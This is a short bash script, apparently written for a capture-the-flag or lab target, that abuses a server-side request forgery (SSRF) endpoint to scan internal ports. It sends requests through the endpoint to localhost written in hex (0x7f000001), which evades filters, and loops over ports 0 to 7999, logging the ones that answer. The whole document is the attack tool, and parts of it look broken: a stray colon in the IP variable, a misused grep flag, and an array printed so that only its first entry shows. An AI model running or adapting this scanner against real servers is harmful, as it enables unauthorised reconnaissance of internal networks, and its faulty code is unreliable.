#!/bin/bash
# Simple script using vaunerable SSRF websites to scan internal ports

# Variables
ip=10.10.187.196: #RHOST ip
port=8000 # RHOST port
url=/attack?url= # the URL form you are attempting to attack
data=http://0x7f000001: # value / data
ports=()
#

# Cycles through 0 - 8000 curling for a response from available port
for ((i = 0 ; i < 8000 ; i++)); do
        # Curl redirects responses to STDERR 
   curl --stderr - $ip$port$url$data$i | if grep -L not 
then
    echo "scanning:" $ip$i
else # if respone does not contain string, port is open add to ports array
    ports+=($i)
    echo "scanning:" $ip $i Open, List now contains: $ports
fi

done
echo $ports
